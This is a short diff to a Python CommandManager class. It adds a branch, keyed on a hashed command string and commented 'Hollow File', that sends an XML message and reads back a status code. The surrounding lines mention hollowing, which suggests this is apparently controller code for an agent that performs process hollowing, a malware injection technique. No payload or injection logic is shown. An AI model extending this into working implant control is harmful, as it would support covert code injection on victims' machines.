@@ -39,6 +39,10 @@ class CommandManager(object):
             self.writer(gen_xml(self.tag, **message).encode())
             print("end Processing hollowing")
             return json.loads(self.reader().decode(errors='replace'))
+        if command == "b11c081208b1d6466c83e37098510d73": #Hollow File
+            self.writer(gen_xml(self.tag, **message).encode())
+            status = self.reader().decode(errors='replace').strip()
+            return tryParse(int, status, 1) == 0
 
         command = gen_xml(self.tag, command=command)
         self.writer(command.encode())
